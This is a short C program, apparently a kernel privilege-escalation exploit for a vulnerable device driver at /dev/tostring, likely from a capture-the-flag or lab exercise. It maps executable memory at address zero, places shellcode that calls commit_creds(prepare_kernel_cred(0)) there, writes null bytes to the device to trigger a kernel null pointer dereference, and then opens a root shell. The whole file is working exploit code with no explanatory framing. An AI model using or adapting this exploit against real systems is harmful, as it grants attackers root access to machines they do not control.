#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>

int main()
{
	// maps shellcode to address 0 for when null pointer is derefernced
	char* m = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	// commit_creds(prepare_kernel_cred(0))
	char sc[] = {0x31, 0xff, 0xba, 0xf0, 0x11,0x07,0xc1,0xff,0xd2,0x89,0xc7,0xba,0x80,0x0e,0x07,0xc1,0xff,0xd2,0xc3};
	// copy shellcode into the mmap'd memory
	memcpy(m, sc, sizeof(sc));
	int fd = open("/dev/tostring", O_RDWR);
	for(int i=0; i<=65; i++){
		write(fd, "\x00", 1); 
	}
	// trigger null pointer dereference 
	system("/bin/sh");
	return 0;
}